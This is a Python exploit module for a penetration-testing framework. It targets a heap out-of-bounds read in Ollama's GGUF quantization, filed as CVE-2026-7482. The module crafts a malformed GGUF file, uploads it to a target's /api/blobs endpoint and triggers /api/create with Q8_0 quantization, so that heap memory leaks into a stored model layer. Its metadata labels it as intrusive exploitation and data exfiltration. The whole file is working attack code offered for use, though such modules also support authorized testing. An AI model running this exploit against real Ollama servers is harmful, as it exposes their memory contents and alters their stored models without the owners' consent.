#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-7482 — Ollama GGUF heap out-of-bounds read (info disclosure)."""

import hashlib
import json
import struct

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.response_validation import parse_json_response
from lib.scanner.target_utils import normalize_scanner_target


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Ollama GGUF Heap OOB Read (CVE-2026-7482)",
        "description": (
            "CVE-2026-7482 in ollama/ollama < 0.17.1: gguf.Decode() trusts attacker tensor "
            "shapes without bounds checks and quantizer.WriteTo() builds an unsafe.Slice spanning "
            "~2 MB beyond a tiny heap allocation during POST /api/create quantize=Q8_0. Uploads a "
            "malicious GGUF (~512 bytes declaring 1024×1024 F16) to /api/blobs/sha256:<hash> then "
            "triggers model creation. Success leaks heap memory into the stored Q8_0 layer."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-7482"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-7482",
            "https://www.cve.org/CVERecord?id=CVE-2026-7482",
        ],
        "tags": [
            "ollama",
            "gguf",
            "heap",
            "info-disclosure",
            "llm",
            "unauthenticated",
            "cve-2026-7482",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "cost": 1.5,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["ollama"],
                "endpoint_pattern_any": ["/api/create", "/api/blobs/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "info_disclosure", "from_detail": "heap bytes in Q8_0 layer"},
                ],
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(11434, "Ollama HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    create_timeout = OptInteger(
        300,
        "Timeout in seconds for streaming /api/create",
        False,
        advanced=True,
    )

    DECLARED_TENSOR_BYTES = 1024 * 1024 * 2
    EXPECTED_LAYER_BYTES = (1024 * 1024 // 32) * 34

    def _host(self) -> str:
        target = str(self.target or "").strip()
        host, _, _ = normalize_scanner_target(target)
        return host or target

    def _base_url(self) -> str:
        port = int(self.port or 11434)
        proto = "https" if self._to_bool(self.ssl) else "http"
        return f"{proto}://{self._host()}:{port}"

    def _api(self, suffix: str) -> str:
        base = (self.path or "/").rstrip("/")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _pack_gguf_str(value: str) -> bytes:
        raw = value.encode()
        return struct.pack("<Q", len(raw)) + raw

    def _kv_uint32(self, key: str, val: int) -> bytes:
        return self._pack_gguf_str(key) + struct.pack("<I", 4) + struct.pack("<I", val)

    def _kv_float32(self, key: str, val: float) -> bytes:
        return self._pack_gguf_str(key) + struct.pack("<I", 6) + struct.pack("<f", val)

    def _kv_string(self, key: str, val: str) -> bytes:
        return self._pack_gguf_str(key) + struct.pack("<I", 8) + self._pack_gguf_str(val)

    def _build_malicious_gguf(self) -> bytes:
        magic = b"GGUF"
        version = struct.pack("<I", 3)
        tensor_count = struct.pack("<Q", 1)
        kvs = [
            self._kv_string("general.architecture", "llama"),
            self._kv_uint32("general.file_type", 1),
            self._kv_uint32("llama.context_length", 512),
            self._kv_uint32("llama.embedding_length", 1024),
            self._kv_uint32("llama.block_count", 1),
            self._kv_uint32("llama.feed_forward_length", 2048),
            self._kv_uint32("llama.attention.head_count", 8),
            self._kv_uint32("llama.attention.head_count_kv", 8),
            self._kv_float32("llama.attention.layer_norm_rms_epsilon", 1e-5),
        ]
        kv_block = b"".join(kvs)
        kv_count = struct.pack("<Q", len(kvs))
        tname = self._pack_gguf_str("blk.0.attn_q.weight")
        ndims = struct.pack("<I", 2)
        dim0 = struct.pack("<Q", 1024)
        dim1 = struct.pack("<Q", 1024)
        ttype = struct.pack("<I", 1)
        toffset = struct.pack("<Q", 0)
        header = magic + version + tensor_count + kv_count + kv_block
        header += tname + ndims + dim0 + dim1 + ttype + toffset
        pad_len = (32 - len(header) % 32) % 32
        header += b"\x00" * pad_len
        return header + (b"\x41" * 32)

    def _stream_create(self, model_name: str, sha256: str):
        url = self._base_url() + self._api("/api/create")
        body = {
            "name": model_name,
            "files": {"model.gguf": f"sha256:{sha256}"},
            "quantize": "Q8_0",
        }
        lines = []
        verify = self._to_bool(getattr(self, "verify_ssl", False))
        try:
            response = requests.post(
                url,
                json=body,
                headers={"Content-Type": "application/json"},
                stream=True,
                timeout=int(self.create_timeout or 300),
                verify=verify,
            )
            for raw in response.iter_lines(decode_unicode=True):
                line = (raw or "").strip()
                if line:
                    lines.append(line)
        except requests.RequestException as exc:
            lines.append(json.dumps({"error": str(exc)}))
        return lines

    def check(self):
        response = self.http_request(
            method="GET",
            path=self._api("/api/tags"),
            allow_redirects=False,
            timeout=int(self.timeout or 10),
        )
        if not response:
            return {"vulnerable": False, "reason": "no HTTP response", "confidence": "low"}
        data, err = parse_json_response(response)
        if err or not isinstance(data, dict) or "models" not in data:
            return {
                "vulnerable": False,
                "reason": "not an Ollama /api/tags endpoint",
                "confidence": "medium",
            }
        return {
            "vulnerable": True,
            "reason": "Ollama API reachable",
            "confidence": "medium",
            "model_count": len(data.get("models") or []),
        }

    def run(self):
        try:
            print_status("CVE-2026-7482 — Ollama GGUF heap OOB read probe")

            result = self.check()
            if not result.get("vulnerable"):
                print_error(result.get("reason", "Target does not appear to be Ollama"))
                return False

            print_success(result.get("reason", "Ollama API reachable"))

            payload = self._build_malicious_gguf()
            sha256 = hashlib.sha256(payload).hexdigest()
            print_info(f"Malicious GGUF: {len(payload)} bytes, sha256:{sha256}")
            print_info(
                f"Declared tensor: {self.DECLARED_TENSOR_BYTES:,} bytes F16; actual data: 32 bytes"
            )

            upload = self.http_request(
                method="POST",
                path=self._api(f"/api/blobs/sha256:{sha256}"),
                data=payload,
                headers={"Content-Type": "application/octet-stream"},
                allow_redirects=False,
                timeout=120,
            )
            if not upload or int(upload.status_code or 0) not in (200, 201):
                code = int(upload.status_code or 0) if upload else 0
                print_error(f"Blob upload failed (HTTP {code})")
                return False
            print_success(f"Blob uploaded (HTTP {int(upload.status_code or 0)})")

            model_name = f"cve-2026-7482-probe-{sha256[:8]}"
            print_status(f"Triggering POST /api/create quantize=Q8_0 (model {model_name})")
            lines = self._stream_create(model_name, sha256)

            for line in lines:
                print_info(line)

            last = lines[-1] if lines else "{}"
            try:
                obj = json.loads(last)
            except ValueError:
                obj = {}

            if "error" in obj:
                err = str(obj["error"])
                if "exceeds file size" in err:
                    print_error("PATCHED — gguf.Decode bounds check rejected tensor")
                    print_info(err)
                    return False
                if "data size" in err and "less than expected" in err:
                    print_error("PATCHED — unsafe.Slice guard blocked quantize")
                    print_info(err)
                    return False
                if "only supported for F16 and F32" in err:
                    print_error(f"Pre-check failed: {err}")
                    return False
                print_error(f"Unexpected error: {err}")
                return False

            layer_digest = None
            for line in lines:
                try:
                    entry = json.loads(line)
                    status = entry.get("status", "")
                    if "creating new layer" in status and "sha256:" in status:
                        layer_digest = status.split("sha256:")[-1]
                except ValueError:
                    pass

            if obj.get("status") == "success":
                print_success("VULNERABLE — heap OOB read confirmed")
                print_info(f"Input file         : {len(payload)} bytes")
                print_info(f"Declared tensor    : {self.DECLARED_TENSOR_BYTES:,} bytes")
                print_info(f"Expected Q8_0 layer: {self.EXPECTED_LAYER_BYTES:,} bytes")
                if layer_digest:
                    print_info(f"New layer digest   : sha256:{layer_digest}")
                print_info(f"Model name         : {model_name}")
                return True

            statuses = []
            for line in lines:
                try:
                    statuses.append(json.loads(line).get("status", ""))
                except ValueError:
                    pass
            if any("quantizing" in s for s in statuses):
                print_success("LIKELY VULNERABLE — quantization completed")
                return True

            print_error("Inconclusive — could not determine result from /api/create stream")
            return False

        except Exception as exc:
            print_error(f"Module failed: {exc}")
            return False
